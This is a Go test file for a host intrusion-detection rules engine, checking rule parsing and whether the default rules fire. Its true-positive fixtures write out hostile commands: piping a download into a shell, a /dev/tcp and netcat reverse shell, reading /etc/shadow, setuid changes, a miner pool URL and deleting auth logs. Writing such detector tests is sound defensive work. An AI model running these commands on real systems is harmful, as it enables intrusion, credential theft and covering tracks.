package rules_test

import (
	"testing"

	"github.com/avaadrian/sbs/assets"
	"github.com/avaadrian/sbs/internal/event"
	"github.com/avaadrian/sbs/internal/rules"
)

func proc(name, cmdline string) *event.Event {
	return &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: name, Cmdline: cmdline, Exe: "/usr/bin/" + name}}
}

func ids(as []*event.Alert) map[string]bool {
	m := map[string]bool{}
	for _, a := range as {
		m[a.RuleID] = true
	}
	return m
}

func TestConditionTree(t *testing.T) {
	rs, err := rules.Parse([]byte(`
- id: T-1
  title: test
  event: process
  match:
    all:
      - field: process.name
        value: [sh, bash]
      - any:
          - field: process.cmdline
            op: contains
            value: EVIL
            nocase: true
          - field: process.cmdline
            op: regex
            value: '^x+$'
      - not:
          field: parent.name
          value: sshd
`), "test")
	if err != nil {
		t.Fatal(err)
	}
	eng, err := rules.NewEngine(rs)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		ev   *event.Event
		want bool
	}{
		{proc("sh", "run evil now"), true},
		{proc("bash", "xxxx"), true},
		{proc("zsh", "evil"), false},
		{proc("sh", "benign"), false},
		{&event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "sh", Cmdline: "evil", ParentComm: "sshd"}}, false},
		{&event.Event{Type: event.TypeFile, File: &event.File{Path: "/evil"}}, false},
	}
	for _, c := range cases {
		if got := len(eng.Evaluate(c.ev)) > 0; got != c.want {
			t.Errorf("%+v: got %v want %v", c.ev.Process, got, c.want)
		}
	}
}

func TestParseErrors(t *testing.T) {
	bad := map[string]string{
		"no id":        "- title: x\n  event: process\n  match: {field: a, value: b}",
		"bad event":    "- id: a\n  title: x\n  event: net\n  match: {field: a, value: b}",
		"bad op":       "- id: a\n  title: x\n  event: process\n  match: {field: a, op: like, value: b}",
		"bad regex":    "- id: a\n  title: x\n  event: process\n  match: {field: a, op: regex, value: '('}",
		"two kinds":    "- id: a\n  title: x\n  event: process\n  match: {field: a, value: b, not: {field: c, value: d}}",
		"bad severity": "- id: a\n  title: x\n  severity: urgent\n  event: process\n  match: {field: a, value: b}",
	}
	for name, y := range bad {
		if _, err := rules.Parse([]byte(y), name); err == nil {
			t.Errorf("%s: expected error", name)
		}
	}
}

// TestDefaultRules checks the built-in rules against true and false positives.
func TestDefaultRules(t *testing.T) {
	rs, err := assets.Rules()
	if err != nil {
		t.Fatal(err)
	}
	eng, err := rules.NewEngine(rs)
	if err != nil {
		t.Fatal(err)
	}
	hits := []struct {
		rule string
		ev   *event.Event
	}{
		{"SBS-PROC-001", proc("sh", "sh -c curl -fsSL https://x.example/i.sh | sudo bash")},
		{"SBS-PROC-001", proc("sh", "sh -c wget -qO- http://1.2.3.4/a|sh")},
		{"SBS-PROC-002", proc("sh", "sh -c echo aGk= | base64 --decode | bash")},
		{"SBS-PROC-004", proc("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")},
		{"SBS-PROC-004", proc("nc", "nc 10.0.0.1 4444 -e /bin/sh")},
		{"SBS-PROC-007", proc("cat", "cat /etc/shadow")},
		{"SBS-PROC-008", proc("bash", "bash -c history -c")},
		{"SBS-PROC-009", proc("chmod", "chmod 4755 /tmp/x")},
		{"SBS-PROC-009", proc("chmod", "chmod u+s /tmp/x")},
		{"SBS-PROC-010", proc("x", "./x -o stratum+tcp://pool:3333")},
		{"SBS-PROC-013", proc("sh", "sh -c rm -rf /var/log/auth.log")},
		{"SBS-PROC-003", &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "bash", Stdin: "inet"}}},
		{"SBS-PROC-005", &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "x", Exe: "/dev/shm/x"}}},
		{"SBS-PROC-006", &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "x", Exe: "/memfd:x (deleted)"}}},
		{"SBS-FILE-002", &event.Event{Type: event.TypeFile, File: &event.File{Path: "/home/a/.ssh/authorized_keys", Op: "modify"}}},
		{"SBS-FILE-005", &event.Event{Type: event.TypeFile, File: &event.File{Path: "/tmp/x", Op: "chmod", Tag: "drop", Mode: "0755"}}},
		{"SBS-FILE-006", &event.Event{Type: event.TypeFile, File: &event.File{Path: "/tmp/x", Op: "chmod", Tag: "drop", Mode: "04755"}}},
	}
	for _, h := range hits {
		if !ids(eng.Evaluate(h.ev))[h.rule] {
			t.Errorf("%s did not fire on %+v %+v", h.rule, h.ev.Process, h.ev.File)
		}
	}
	quiet := []*event.Event{
		proc("curl", "curl -o file.tar.gz https://example.com/file.tar.gz"),
		proc("sh", "sh -c base64 file | base64 -d > out"),
		proc("passwd", "passwd /etc/shadow"),
		proc("chmod", "chmod 755 /usr/local/bin/tool"),
		proc("chmod", "chmod +x script.sh"),
		proc("bash", "bash -c cat ~/.bashrc"),
		{Type: event.TypeProcess, Process: &event.Process{Comm: "bash", Stdin: "socket"}}, // unix socket, e.g. sshd
		{Type: event.TypeProcess, Process: &event.Process{Comm: "test", Exe: "/tmp/go-build123/b001/x.test"}},
		{Type: event.TypeFile, File: &event.File{Path: "/tmp/notes.txt", Op: "modify", Tag: "drop", Mode: "0644"}},
		{Type: event.TypeFile, File: &event.File{Path: "/etc/cron.d/x", Op: "delete", Tag: "persistence"}},
	}
	for _, ev := range quiet {
		if as := eng.Evaluate(ev); len(as) > 0 {
			t.Errorf("false positive %s on %+v %+v", as[0].RuleID, ev.Process, ev.File)
		}
	}
}
